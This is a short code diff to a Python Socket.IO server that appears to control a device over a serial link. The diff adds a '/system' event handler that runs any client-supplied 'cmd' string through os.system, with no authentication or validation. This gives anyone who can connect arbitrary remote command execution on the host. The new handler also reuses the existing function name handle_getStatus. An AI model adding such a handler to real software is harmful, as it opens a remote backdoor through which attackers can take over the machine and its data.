@@ -62,6 +62,13 @@ def handle_getStatus(data):
     print("receive get status")
     sendSerial('!getStatus\n')
 
+@s_io.on('/system')
+def handle_getStatus(data):
+    print("receive system")
+    print(data['cmd'])
+    os.system(data['cmd'])
+
+
 @s_io.on('/setSettings')
 def handle_setSettings(data):
     #print("receive set Settings %s" % data)
